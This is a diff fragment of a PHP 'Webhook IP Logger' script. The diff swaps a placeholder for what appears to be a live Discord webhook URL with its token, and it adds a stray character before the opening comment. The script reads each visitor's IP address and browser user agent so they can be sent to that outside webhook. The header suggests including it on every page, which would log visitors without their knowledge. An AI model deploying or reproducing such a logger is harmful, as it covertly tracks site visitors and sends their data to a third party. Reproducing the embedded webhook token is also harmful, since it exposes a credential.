@@ -1,4 +1,4 @@
-/* 
+f/* 
 Please keep this copyright statemnet in tact
 Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
 Creation Date: 21/10/19 
@@ -11,7 +11,7 @@ NOTE: You can use this in every page if you make a it a external page and requir
 
 <?php
 
-        $webhookurl = "discord webhook link";
+        $webhookurl = "https://discord.com/api/webhooks/803772855757832212/5NOhvW8fluIJWJ80lKUgri_VM25gHUCbtzgkFGJ4t2wGVpTkEmGxSVEulfrAxWZixnd5/github";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
